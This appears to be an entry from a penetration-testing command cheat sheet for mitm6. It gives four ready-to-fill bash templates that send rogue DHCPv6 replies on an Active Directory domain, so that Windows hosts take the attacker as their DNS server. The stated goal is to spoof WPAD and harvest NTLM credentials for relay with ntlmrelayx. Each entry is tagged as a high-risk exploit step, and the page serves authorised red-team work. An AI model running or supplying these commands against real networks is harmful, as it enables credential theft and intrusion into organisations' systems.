# Mitm6
> IPv6 DHCP poisoner: sends rogue DHCPv6 replies so Windows hosts use the attacker as IPv6 DNS, then spoofs WPAD to harvest NTLM. Pair with `ntlmrelayx -6` to relay.

<!-- tags: ad,mitm6,ipv6,dhcpv6,wpad,ntlm-relay,mitm,exploit -->

---

## poison dhcpv6 for domain
Start mitm6 against the domain - replies to DHCPv6 from any host in the domain's DNS suffix. Pair with `ntlmrelayx -6`.

```bash
mitm6 -d {{DOMAIN:domain:corp.local}}
```

<!-- meta: risk=high | phase=exploit | tags=ipv6,dhcpv6,poison,wpad -->

---

## poison dhcpv6 on specific interface
Bind to a specific interface when you have multiple network namespaces (tap, tun0, eth1, etc.).

```bash
mitm6 -d {{DOMAIN:domain:corp.local}} -i {{IFACE:str:eth0}}
```

<!-- meta: risk=high | phase=exploit | tags=ipv6,dhcpv6,poison,interface -->

---

## poison dhcpv6 single host only
Restrict spoofing to a single FQDN - useful when you want to coerce only one machine and avoid flooding the network.

```bash
mitm6 -d {{DOMAIN:domain:corp.local}} --host-allowlist {{RHOST_NAME:str:target.corp.local}}
```

<!-- meta: risk=high | phase=exploit | tags=ipv6,dhcpv6,poison,target,allowlist -->

---

## poison dhcpv6 exclude critical hosts
Blocklist mode - poison everyone except specified hosts. Use when DCs or critical hosts should not be touched.

```bash
mitm6 -d {{DOMAIN:domain:corp.local}} --host-blocklist {{SKIP_HOST:str:dc01.corp.local}}
```

<!-- meta: risk=high | phase=exploit | tags=ipv6,dhcpv6,poison,blocklist -->
